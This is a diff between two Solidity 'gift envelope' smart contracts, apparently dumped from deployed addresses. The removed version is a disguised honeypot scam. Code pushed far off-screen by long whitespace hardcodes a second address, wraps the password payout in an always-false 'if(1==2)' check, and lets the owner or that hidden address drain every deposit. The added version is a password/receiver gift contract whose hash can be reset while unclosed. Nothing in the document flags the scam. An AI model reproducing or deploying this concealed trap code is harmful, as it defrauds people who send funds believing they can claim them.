@@ -1,41 +1,81 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_Envelope at 0xC1FbB18de504e0bba8514Ff741F3109D790ed087
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_ENVELOPE at 0xbF5fb038c28df2B8821988DA78C3EBDBf7Aa5Ac7
 */
 pragma solidity ^0.4.19;
 
-contract GIFT_Envelope    
+contract GIFT_ENVELOPE
 {
-    function()payable{}
-    
-    function CalcHash(bytes password) 
-    pure
-    returns (bytes32) 
-    {
-        return sha3(password);
-    }
-    
-    bytes32 public hashPass;
-    
-    bool public closed = false;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    address own = msg.sender;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     address cr = 0x51E5c829EbE2B9fc1C5cf74078225d57Eb324A3c;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
-    function Put(bytes32 hash)
-    public
-    payable
-    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           if(msg.sender==own){
-        if(!closed&&(msg.value > 1 ether))
-        {
-            hashPass = hash;
-        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             }
-    }
-    
-    function Open(bytes password)
+    function GetGift(bytes pass)
     external
     payable
-    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   if(1==2){                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-        if(hashPass == sha3(password))
+    {
+        if(hashPass == keccak256(pass) && now>giftTime)
         {
             msg.sender.transfer(this.balance);
-            closed = false;
-        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             } if(msg.sender==own){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      if(msg.sender==cr){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+        }
     }
+    
+    function GetGift()
+    public
+    payable
+    {
+        if(msg.sender==reciver && now>giftTime)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    bytes32 hashPass;
+    
+    bool closed = false;
+    
+    address sender;
+    
+    address reciver;
+ 
+    uint giftTime;
+ 
+    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
+    
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
+        {
+            hashPass = hash;
+            sender = msg.sender;
+            giftTime = now;
+        }
+    }
+    
+    function SetGiftTime(uint date)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            giftTime = date;
+        }
+    }
+    
+    function SetReciver(address _reciver)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            reciver = _reciver;
+        }
+    }
+    
+    function PassHasBeenSet(bytes32 hash)
+    public
+    {
+        if(hash==hashPass&&msg.sender==sender)
+        {
+           closed=true;
+        }
+    }
+    
+    function() public payable{}
+    
 }
